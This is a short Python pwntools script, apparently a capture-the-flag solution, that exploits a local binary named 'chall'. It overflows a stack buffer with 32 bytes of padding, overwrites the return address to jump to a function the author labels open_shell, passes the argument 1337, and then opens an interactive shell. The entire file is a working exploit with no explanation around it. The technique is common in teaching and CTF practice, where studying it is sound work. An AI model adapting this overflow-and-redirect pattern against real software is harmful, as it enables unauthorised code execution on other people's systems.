from pwn import *

elf = ELF('./chall')
context.binary = elf
#p = gdb.debug(elf.path, gdbscript='b *say_my_name+48')
p = process(elf.path)

padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'

open_shell = p32(0x80491b6)

p.recv()

p.sendline(padding + open_shell + p32(0) + p32(1337))

p.interactive()
